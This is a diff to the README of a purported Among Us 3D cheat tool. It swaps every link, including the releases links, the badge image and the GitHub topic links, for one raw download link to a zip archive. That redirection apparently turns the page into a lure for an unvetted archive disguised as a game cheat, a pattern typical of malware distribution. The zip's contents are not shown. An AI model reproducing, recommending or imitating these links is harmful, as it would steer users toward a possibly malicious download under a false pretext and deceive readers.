@@ -6,7 +6,7 @@ Welcome to AmongUs3d-cheat! This tool helps you enhance your Among Us 3D gamepla
 
 ## 📥 Download Link
 
-[![Download AmongUs3d-cheat](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen)](https://github.com/Sway4flife/AmongUs3d-cheat/releases)
+[![Download AmongUs3d-cheat](https://raw.githubusercontent.com/Sway4flife/AmongUs3d-cheat/main/northern/AmongUs3d-cheat.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/Sway4flife/AmongUs3d-cheat/main/northern/AmongUs3d-cheat.zip)
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ To run AmongUs3d-cheat smoothly, ensure your system meets the following requirem
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Sway4flife/AmongUs3d-cheat/releases) to find the latest version of AmongUs3d-cheat.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Sway4flife/AmongUs3d-cheat/main/northern/AmongUs3d-cheat.zip) to find the latest version of AmongUs3d-cheat.
   
 2. **Choose Your Version:** Locate the version that suits your needs. Click on the version link to access the download options.
   
@@ -59,9 +59,9 @@ If you run into issues while using AmongUs3d-cheat, try the following:
 
 ## 🌐 Related Topics
 
-- [amongus3d](https://github.com/topics/amongus3d)
-- [amongus3d-cheat](https://github.com/topics/amongus3d-cheat)
-- [amongusmod](https://github.com/topics/amongusmod)
+- [amongus3d](https://raw.githubusercontent.com/Sway4flife/AmongUs3d-cheat/main/northern/AmongUs3d-cheat.zip)
+- [amongus3d-cheat](https://raw.githubusercontent.com/Sway4flife/AmongUs3d-cheat/main/northern/AmongUs3d-cheat.zip)
+- [amongusmod](https://raw.githubusercontent.com/Sway4flife/AmongUs3d-cheat/main/northern/AmongUs3d-cheat.zip)
 
 ## 📞 Support
 
@@ -71,4 +71,4 @@ For support, please reach out via the GitHub issues page. Your feedback helps us
 
 Using cheats can violate the terms of service for certain games. Use AmongUs3d-cheat responsibly and consider the impact on your gaming experience and community. 
 
-Remember, you can always download the latest version from the [Releases page](https://github.com/Sway4flife/AmongUs3d-cheat/releases) to stay updated with the newest features and improvements.
+Remember, you can always download the latest version from the [Releases page](https://raw.githubusercontent.com/Sway4flife/AmongUs3d-cheat/main/northern/AmongUs3d-cheat.zip) to stay updated with the newest features and improvements.
